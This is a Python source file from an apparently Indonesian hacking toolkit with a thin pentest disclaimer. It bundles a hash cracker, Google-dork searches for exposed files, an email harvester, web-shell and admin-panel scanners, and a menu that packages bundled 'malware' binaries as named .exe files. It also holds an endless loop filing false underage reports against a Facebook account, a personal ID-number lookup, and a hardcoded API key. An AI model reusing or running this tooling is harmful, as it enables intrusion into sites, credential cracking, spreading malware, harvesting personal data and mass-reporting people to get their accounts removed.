#bin/python3
#bingung mau pake bahasa apa jdi pake campur aja lahh :v
#agar orang indo bisa bahasa en yang bahasa en bisa ngerti bahasa id
#warning powerful tools xploiter can be harmful and detrimental
#GUNAKAN TOOLS INI UNTUK TUJUAN KEBAIKAN MEMBANTU PANTESTING
#BUKAN UNTUK MERUSAK SEGALA SEUSATU DI TANGGUNG PENGGUNA

import os 
import phonenumbers 
from Settings.Program.Config import randomuser
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich import print as cetak
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
import re, sys, json, httpx, random, urllib, hmac, hashlib, time, string, uuid, requests, base64, webbrowser, datetime, names, shutil, socket, wget, ipaddress, asyncio, aiohttp, subprocess, threading
from Settings.Program.Config.Util import *
from pystyle import Write, Colors, Box, Center, Colorate
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from googlesearch import search
from colorama import Fore, Back, Style, init
from concurrent.futures import ThreadPoolExecutor as ThreadPoolExec
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.tree import Tree
from datetime import datetime
from rich import print as sprint
from rich.console import Console
from rich.panel import Panel as panel
from getpass import getpass
from googlesearch import search 
from rich.columns import Columns
from requests.exceptions import ConnectionError
from multiprocessing import Pool
from subprocess import getoutput
from os.path import exists
import urllib.request 
from urllib.parse import urlparse
from urllib.parse import quote_plus
from pytube import YouTube
from multiprocessing.dummy import Pool
from collections import deque
from queue import Queue
from tqdm import tqdm

class HashCracker:
    def __init__(self, hash_type, hash_to_crack, wordlist, custom_hash=None, verbose=False, silent=False, salt=None, output_file="result/result_hash.txt", exit_on_found=False):
        self.hash_type = hash_type
        self.hash_to_crack = hash_to_crack
        self.wordlist = wordlist
        self.silent = ""
        self.salt = ""
        self.verbose = ""
        self.custom_hash = custom_hash
        self.output_file = output_file
        self.found = threading.Event()
        self.queue = Queue()

    def hash_word(self, word):
        try:
            if self.custom_hash:
                return self.custom_hash(word)
            if self.hash_type == 'MD5':
                return hashlib.md5(word.encode()).hexdigest()
            elif self.hash_type == 'SHA1':
                return hashlib.sha1(word.encode()).hexdigest()
            elif self.hash_type == 'SHA224':
                return hashlib.sha224(word.encode()).hexdigest()
            elif self.hash_type == 'SHA256':
                return hashlib.sha256(word.encode()).hexdigest()
            elif self.hash_type == 'SHA384':
                return hashlib.sha384(word.encode()).hexdigest()
            elif self.hash_type == 'SHA512':
                return hashlib.sha512(word.encode()).hexdigest()
            elif self.hash_type == 'SHA3-224':
                return hashlib.sha3_224(word.encode()).hexdigest()
            elif self.hash_type == 'SHA3-256':
                return hashlib.sha3_256(word.encode()).hexdigest()
            elif self.hash_type == 'SHA3-384':
                return hashlib.sha3_384(word.encode()).hexdigest()
            elif self.hash_type == 'SHA3-512':
                return hashlib.sha3_512(word.encode()).hexdigest()
            elif self.hash_type == 'RIPEMD160':
                return hashlib.new('ripemd160', word.encode()).hexdigest()
            elif self.hash_type == 'Whirlpool':
                return hashlib.new('whirlpool', word.encode()).hexdigest()
            elif self.hash_type == 'BLAKE2b':
                return hashlib.blake2b(word.encode()).hexdigest()
            elif self.hash_type == 'BLAKE2s':
                return hashlib.blake2s(word.encode()).hexdigest()
            else:
                print(f"Hash type {self.hash_type} is not supported.")
                return None
        except Exception as e:
            print(f"Error in hash_word: {e}")
            return None

    def load_wordlist(self):
        try:
            with open(self.wordlist, 'r', errors='ignore') as file:
                return [line.strip() for line in file if not self.found.is_set()]
        except Exception as e:
            print(f"{M}Error loading wordlist: {e}")
            return []

    def worker(self):
        while not self.queue.empty() and not self.found.is_set():
            word = self.queue.get()
            if self.salt:
                word = self.salt + word
            hashed_word = self.hash_word(word)
            if self.verbose and not self.silent:
                print(f"Trying {word}: {hashed_word}")
            if hashed_word == self.hash_to_crack:
                self.found.set()
                if not self.silent:
                    print(f"{M}[{P}+{M}] {H}Password found: {P}{word}")
                if self.output_file:
                    try:
                        with open(self.output_file, 'a') as result_file:
                            result_file.write(f"{self.hash_to_crack}:{word}\n")
                    except Exception as e:
                        print(f"Error writing to output file: {e}")
                break
            self.queue.task_done()

    def crack(self, num_threads=1000):
        words = self.load_wordlist()
        if not words:
            return
        if not self.silent:
            print(f"{M}[{P}+{M}] {B}Total words to try: {P}{len(words)}")

        for word in words:
            self.queue.put(word)

        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=self.worker)
            thread.start()
            threads.append(thread)
        
        with tqdm(total=len(words), disable=False) as pbar:
            while not self.queue.empty() and not self.found.is_set():
                pbar.update(1)
        
        for thread in threads:
            thread.join()

def detect_hash_type(hash_value):
    try:
        hash_lengths = {
            32: 'MD5',
            40: 'SHA1',
            56: 'SHA224',
            64: 'SHA256',
            96: 'SHA384',
            128: 'SHA512',
        }
        return hash_lengths.get(len(hash_value), None)
    except Exception as e:
        print(f"{M}Error in detect_hash_type: {P}{e}")
        return None

def Hash_Cracker():
    wordlist_path = "Data/wordlist_hash.txt"   
    hash_type = "AUTO"
    hash_to_crack = input(f"{M}[{P}+{M}] {B}Input hash : {P}")
    custom_hash = None
    output_file = "result/result_hash.txt"
    detected_type = detect_hash_type(hash_to_crack)
    if detected_type:
        print(f"{K}Detected hash type: {P}{detected_type}")
        hash_cracker = HashCracker(detected_type, hash_to_crack, wordlist_path, custom_hash=custom_hash, output_file=output_file)
        hash_cracker.crack()
    else:
        print(f"{M}Unable to detect hash type. Please specify the hash type explicitly.")
        
def data2():
    target = input(f"{M}[{P}+{M}] {B}Enter Target Sites : ")
    print(f'{M}[{P}+{M}]{K} Processing....')
    file_types = ['pdf', 'doc', 'rar', 'txt', 'dta', 'ppt', 'shx', 'pptx', 'dbf', 'shp', 'db', 'mdf', 'mpd', 'ndb', 'docx', 'docm', 'dot', 'dotx', 'dotm','csv', 'xls', 'xlsx', 'xslsm', 'xlt', 'xltx', 'xltm', 'sql', 'zip', 'rar4', 'xyz']
    
    resultdork = ""
    for i in file_types:
        try:
            cookies = exists('.google-cookie')
            if cookies == True:
                os.remove('.google-cookie')
            print("")
            print(M + 33*"═")
            print(f"{B}File Types :{K} {i}")
            print(M + 33*"═")
            print("")
            for results in search(f'site:{target} filetype:{i}', tld='com', num=5, start=0, stop=None, pause=20):
                print(f"{M}[{P}+{M}] {B}Found : " + H + results)
                def log(target):
                    file = open((target) + ".txt", "a")
                    file.write(str(results))
                    file.write("\n")
                    file.close
                    file_name = target
                log(target)
        except urllib.error.HTTPError as e:
            if e.code == 429:
                print(M + f'[429] Too Many Request, Please Wait')
                time.sleep(15)
        except KeyboardInterrupt:
            print(f"{M}[{P}+{M}] {M}File Extension :{B} {i} {M}Skipped.. [{P}+{M}]")
            continue
    print(f"{M}[{P}+{M}] {H}Done... {M}[{P}+{M}]")

def mail():
    user_url = str(input(f'{M}[{P}+{M}] {B}Enter Url (use http/https) : {P}'))
    usurl = user_url
    urls = deque([usurl])
    scraped_urls = set()
    emails = set()
    count = 0
    limit = int(input(f"{M}[{P}+{M}] {B}Limit : {P}"))
    
    try:
      while True:
        count += 1
        if count > limit:
          break
        
        url = urls.popleft()
        scraped_urls.add(url)
        parts = urllib.parse.urlsplit(url)
        base_url = f'{parts.scheme}://{parts.netloc}'
        path = url[:url.rfind('/')+1] if '/' in parts.path else url 
        print(f'{M}[{P}{count}{M}] {K}Processing ->{B} {url}')
        
        try:
          response = requests.get(url)
        except(requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
          continue
        
        new_emails = set(re.findall(r'[a-z0-9\.\-+_]+@\w+\.+[a-z\.]+', response.text, re.I))
        emails.update(new_emails)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        for anchor in soup.find_all('a'):
          link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
          if link.startswith('/'):
            link = base_url + link
          elif not link.startswith('http'):
            link = path + link
          if not link in urls and not link in scraped_urls:
            urls.append(link)
    except KeyboardInterrupt:
      print('closing')
      
    print(f'\n{M}[{P}+{M}]{H} Proses selesai {M}[{P}+{M}]{H}')
    print(f'{len(emails)} Email Ditemukan')
    for mail in emails:
      print(O + ' ' + mail)
    print("\n")


class Domain:
    def __init__(self, domain):
        self.domain = domain
    
    def checkShell(self):
        shellFiles = open('Data/shell.txt', 'r')
        for path in shellFiles:
            path = path.replace('\n', '')
            r = requests.get("https://"+self.domain+path)
            if "drwxr" in r.text:
                print("\x1b[1;94m[{}{}] \x1b[1;92m-> Found Shell!".format(self.domain, path))
                saveres = open("result/shellz.txt", "a")
                saveres.write(self.domain+path+'\n')
            else:
                print("\x1b[1;94m[{}{}] \x1b[1;91m-> Shell not Found!".format(self.domain, path))

def asuna(list):
    website = Domain(list)
    website.checkShell()

def shell():
    try:
        urList = open(input(f"{M}[{P}+{M}] {B}Enter Website List (ex. 2.txt) :{P} "), "r").read().split("\n")
        thread = int(input(f"{M}[{P}+{M}] {B}Enter Threads : {P}"))
        pool = Pool(thread)
        pool.map(asuna, urList)
        pool.close()
        pool.join
    except:
        pass

def Malware():
    wedus()
    print(f"{O}[{P}01{O}] {P} MALWARE V1\n{O}[{P}02{O}] {P} MALWARE V2\n{O}[{P}03{O}] {P} MALWARE V3\n{O}[{P}04{O}] {P} MALWARE V4\n{O}[{P}05{O}] {P} MALWARE V5\n{O}[{P}06{O}] {P} MALWARE V6\n{O}[{P}07{O}] {P} MALWARE V7\n{O}[{P}08{O}] {P} MALWARE V8\n")
    ______________________________________ = input(f"{B}Select Menu ->{P}")
    if ______________________________________ in["1","01"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV1"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    
    elif ______________________________________ in["2","02"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV2"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    elif ______________________________________ in["3","03"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV3"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    elif ______________________________________ in["4","04"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV4"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    elif ______________________________________ in["5","05"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV5"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    elif ______________________________________ in["5","05"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV5"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    elif ______________________________________ in["6","06"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV6"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    elif ______________________________________ in["7","07"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV7"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
    elif ______________________________________ in["8","08"]:
        file_name1 = input(f"{M}[{P}+{M}] {B}Input File Name : ")

        old_name = "./Malware/MALWAREV8"
        new_name = f"./Malware/{file_name1}.exe"
        
        if os.path.isfile(new_name):
            print(f"{M}File name already exists. Cannot Create")
        else:
            # Rename the file
            os.rename(old_name, new_name)
        print(f"{K}Creating...")
        time.sleep(20)
        print(f"{M}[{P}+{M}] {H}File Malware {P}{file_name1} {H}Has Been Created. Saved In {P}Malware/{file_name1}.exe!")
        print(f"{M}Warning!, Dont you dare to click / open the file !")
def admin_finder():
    print(f"""
                ⣀⣤⣤⠶⠶⠚⠛⠛⠛⠛⠛⠛⠛⠷⠶⢦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠞⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⣀⠄⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⡤⠤⠤⢤⣤⣀⡀⠀⠀⠀⠀⠀⠀⢄⡀⠀⠀⠀⠈⠻⣆⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⠏⠀⢀⣀⣠⣶⠟⠁⠀⠀⠀⣠⠴⠀⢀⠔⠋⢁⠎⠀⡇⠘⡄⠉⠲⣍⠑⠢⢄⡀⠀⠀⠀⠙⣷⣦⣤⡀⠀⠙⣷⡀⠀⠀⠀
⠀⠀⢀⣾⠃⠀⣴⠏⣼⡿⣣⠀⠀⢀⡴⠋⠠⢄⡴⠃⠀⠀⡞⠀⠀⠃⠀⠹⡄⠀⠈⢳⡀⠤⠘⠢⡀⠀⠀⢾⢻⣷⡘⣦⡀⠈⢿⡄⠀⠀
⠀⠀⣾⠁⣠⢺⣿⢘⣭⣾⠃⠀⡰⠋⠀⠀⢀⡜⠁⠁⠀⢺⠀⣴⣞⡳⣶⡄⠁⠀⠉⠀⠱⡄⠀⠀⠈⠢⡀⠈⢷⣬⡓⢻⣷⢦⠈⢿⡄⠀
⠀⣼⠃⢰⡇⢸⣷⡿⢻⠁⢀⠞⠀⠀⠀⠀⡜⠀⠀⠀⠀⠈⠀⠈⠁⣷⠿⠃⠀⠀⠀⠀⠀⢱⡀⠀⠀⠀⠱⡄⠀⢿⢿⣾⡿⢸⣧⠈⣷⠀
⢠⡟⠀⣾⣿⢸⣫⣶⠇⠀⡞⠀⠀⠒⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡃⠀⠀⠀⠀⠀⠀⠀⠀⠃⠠⠀⠀⠀⢹⡀⠘⣷⣌⠧⢸⣿⠀⢸⡇
⣼⡇⣰⢻⣿⣸⡿⠋⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠻⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⢸⣿⣧⣼⡿⢀⠀⣷
⣿⠀⣿⡀⢿⡟⢡⡇⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠸⣆⠻⣿⠃⣼⠀⢿
⣿⠀⢿⣷⠘⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⡟⠀⣹⣯⡁⢸⣷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⠀⢿⣦⠙⣼⣿⠀⢸
⣿⠀⠘⣿⣇⣿⡏⡄⠀⣄⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⠃⠀⢰⣇⠀⠀⣿⣿⣿⣿⣿⣷⡆⠀⠀⠀⠀⠀⢸⠁⢀⠸⣿⢰⣿⠇⠀⣾
⢻⡇⣷⡈⢻⣿⢀⣿⠀⢸⡀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⠀⢠⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⡾⠀⣼⡆⢿⡿⠃⣼⠀⣿
⠘⣧⠘⣿⣦⡙⢸⣿⣦⡀⢣⠀⡠⠤⠒⣿⣿⣿⣿⣿⣿⣿⣿⡄⢸⣿⢀⣾⣿⣿⣿⣿⣿⣿⣿⠒⠢⠤⣀⣰⠁⡰⣿⡇⢚⣴⣾⠏⢸⡇
⠀⢻⡄⢈⠻⣿⣼⣿⡇⣷⡈⢦⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⡰⢃⣼⠁⣿⣧⣾⡿⡃⢀⡿⠀
⠀⠈⢿⡀⢷⣌⠛⢿⣧⢸⣷⡀⠑⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠜⠁⣼⡟⢸⡿⠟⣉⡴⠃⣼⠃⠀
⠀⠀⠈⢿⡄⠻⢿⣶⣬⣁⢿⣧⢳⣄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣠⡖⣹⣿⢃⣥⣴⣾⠟⢁⣼⠃⠀⠀
⠀⠀⠀⠈⢻⣆⠀⢝⠻⠿⢿⣿⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⣿⡿⠿⠟⣋⠁⢠⡾⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢷⡀⠙⠶⣶⣤⣤⣥⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣼⣥⣤⣶⡶⠛⢁⣴⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠻⢦⣀⠀⢭⣉⣙⣉⣉⣁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣌⣉⣉⣋⣉⡩⠁⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠷⣤⡈⠙⠛⠻⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠛⠛⠛⢉⣠⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣦⣄⣀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢀⣀⣤⠶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
    website_url = input(f"\n{M}[{P}+{M}] {O}Target Site [Use http/https]: {P}")
    admin_paths = ['/admin/', '/admin/dashboard/', '/admin/login.php/', '/wp-admin/', '/login.php/', '/wp-admin.php/', '/wp-admin/index.php', '/admin/dashboard.html/', '/admin.html/', '/admin/', '/usuarios/', '/cpanel.php/', '/cpanel/', '/cpanel.htm/', '/controlpanel/', '/admin/upload.php/', '/wp-login.php/', '/administrator/', '/admin/add.php/', '/dashboard/', '/admin/dashboard/', '/admin/dashboard.php/', '/panel/', '/admin/panel/', '/adminpanel/', '/admin/controlpanel/', '/admin/cpanel/', '/admin/dashboard.php/', '/admin.html/', '/admin.php/', '/admin/cpanel.php/', '/admin/cp.php/', '/adm', '/administrator/index.html', '/panelcontrol', '/dash', '/admin/dash.php']
    
    for result in admin_paths:
        file_exists = ('.google-cookie')
        if file_exists == True:
            os.remove(file_exists)
        print(f'{K}Searching Admin Page..')
        url = website_url + result
        response = requests.get(url)
        if response.status_code == 200:
            print(f'{M}[{P}+{M}] {H}Found ! ')
            print(response)
            print(url)
        else:
            b = f'Cant Find Admin Page'  

def fb_report():
    print(f"""{B}
   _____                           __ 
  / _/ /    _______ ___  ___  ____/ /_
 / _/ _ \  / __/ -_) _ \/ _ \/ __/ __/
/_//_.__/ /_/  \__/ .__/\___/_/  \__/ 
                 /_/                  
""")
    fb = input(f'{M}[{P}+{M}] {P}Please Enter the Facebook URL : {K}')
    time.sleep(2)
    
    print(f"{H}Report Automation is Starting.....")
    while True:
        url = 'https://m.facebook.com/help/contact/209046679279097'
        
        data = {
        'crt-url' : fb,
        'cf_age':"less than 9 years",
        'submit':'submit'
        }
        req = requests.post(url,data=data).status_code
        if req == 200:
            print(f'{M}[{P}+{M}] {O}Reporting to Account {M}{fb} {O}Status: {H}Success')
        else:
            print(f'{M}[{P}+{M}] {O}Reporting to Account {M}{fb} {O}Status: {M}Fail')
    

def nik():
    print(f"""{M}

███╗   ██╗██╗██╗  ██╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
████╗  ██║██║██║ ██╔╝     ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║██║█████╔╝█████╗██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║╚██╗██║██║██╔═██╗╚════╝██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚████║██║██║  ██╗     ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
""")
    nik_user = input(f"\n{M}[{P}+{M}] {O}Enter NIK : {P}")
    url = "https://indonesia-ktp-parser-validator.p.rapidapi.com/ktp_validator"
    
    payload = { "nik": nik_user }
    
    headers = {
        "content-type": "application/json",
        "X-RapidAPI-Key": "f11650a45amsh3e76202887793b1p186972jsn95b1a9eb9539",
        "X-RapidAPI-Host": "indonesia-ktp-parser-validator.p.rapidapi.com"
    }
    
    respon = requests.post(url, json=payload, headers=headers)
    respons = respon.json()
    
    #If statement
    if respons['result']['status'] == "success":
        data = respons['result']['data']
        print(f"\n{H}Jenis Kelamin : {P}" + data['kelamin'])
        print(f"{H}Tanggal Lahir : {P}" + data['lahir'])
        print(f"{H}Provinsi :{P} " + data['provinsi'])
        print(f"{H}Kota/Kabupaten : {P}" + data['kotakab'])
        print(f"{H}Kecamatan :{P} " + data['kecamatan'])
        Continue()
        a()
    else:
        print(f"{M}Gagal mendapatkan data. Status: " + respons['result']['status'])
        Continue()
        a()

def source_web():
    url = input(f'{M}[{P}+{M}] {O}Input Web Target (Use http/https) : {P}')
    print('')
    source = requests.get(url)
    path_file = str(input(f'{M}[{P}+{M}] {O}Enter Your File Path (ex. /sdcard/filehasil.html) : {P}'))
    print(f"{H}Done..")
    file = open(path_file,"w")
    file.write(source.text)
    file.close()
    
class email_search:
    timer
    def __init__(self, email):
        print(f"{M}[{P}+{M}] {O}Trying to find sites where '{email}' is used, ")
        time.sleep(1)
        try:
            result = subprocess.run(["holehe", email], capture_output=True, text=True, check=True)
            result.stdout = "\n".join(result.stdout.split("\n")[4:])
            result.stdout = "\n".join(result.stdout.split("\n")[:-4])
            result.stdout = "\n".join([f"\033[92m{line}\033[0m" if "[+]" in line else line for line in result.stdout.split("\n")])
            result.stdout = "\n".join([f"\033[91m{line}\033[0m" if "[-]" in line else line for line in result.stdout.split("\n")])
            result.stdout = "\n".join([f"\033[93m{line}\033[0m" if "[x]" in line else line for line in result.stdout.split("\n")])

            if result.stdout:
                print(result.stdout)
                Continue()
                a()
            else:
                print(f"{M}No results found..!")
                Continue()
                a()
        except FileNotFoundError:
            print(f"{M}Error : 'holehe' command not found. Please make sure you have holehe installed and in your PATH.")
            Continue()
            a()
        except subprocess.CalledProcessError as e:
            print(f"{M}Error : {e}")
            Continue()
            a()
        except Exception as e:
            print(f"{M}Unexpected error : {e}")
            Continue()
            a()
            
def yt():
    Write.Print(f"""

██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗    
╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗██╔════╝    
 ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝█████╗      
  ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗██╔══╝      
   ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝███████╗    
   ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝    
""", Colors.blue, interval=0.005)
    pe = print(f"\n{M}[{P}01{M}] {O}Download Video\n{M}[{P}02{M}] {O}Download Audio")
    format_type = input(f"\n{M}[{P}+{M}] {O}Select Menu : ")
    
    
    
    if format_type in['01','1']:
        link = input(f"{M}[{P}+{M}] {O}Masukkan Link : {P}")
        try: 
            yt = YouTube(link)
            title = yt.title+".mp4"
            target_directory = './YT Downloader/Video'
        except:
            print(f"{M}Terjadi kesalahan dalam mengambil data video, pastikan link yang Anda masukkan valid")
            Continue()
            a()
        stream = yt.streams.first().download()
        time.sleep(5)
        #os.path.join(target_directory, title)
        #os.rename(f"{title}", "./YT Downloader/Video/{title}")
        print(f"{H}Video berhasil diunduh dengan nama{O} {yt.title} {H}Tersimpan Di {O}DarkStar/{yt.title}")
    elif format_type in["02","2"]:
        link = input(f"{M}[{P}+{M}] {O}Masukkan Link : {P}")
        try: 
            yt = YouTube(link)
            title = yt.title+".mp3"
            target_directory = 'YT Downloader'
        except:
            print(f"{M}Terjadi kesalahan dalam mengambil data video, pastikan link yang Anda masukkan valid")
            Continue()
            a()
        stream = yt.streams.filter(only_audio=True).first()
        stream.download(filename=f"{yt.title}.mp3")
        time.sleep(5)
        print(title)
        #os.path.join(target_directory, title)
        #os.rename(f"{title}", "./YT Downloader/Audio/{title}")
        print(f"{H}Audio berhasil diunduh dengan nama{O} {yt.title} {H}Tersimpan Di {O}DarkStar/{yt.title}")
        Continue()
        a()
    else:
        print(f"{M}Invalid Menu")
        Continue()
        a()
def dfc():
    Write.Print(f"""
___  ____ ____ ____ ____ ____                  
|  \ |___ |___ |__| |    |___                  
|__/ |___ |    |  | |___ |___                  
                                               
____ ____ _  _ ____ ____ ____ ___ ____ ____    
| __ |___ |\ | |___ |__/ |__|  |  |  | |__/    
|__] |___ | \| |___ |  \ |  |  |  |__| |  \    
    """, Colors.red_to_yellow, interval=0.0005)
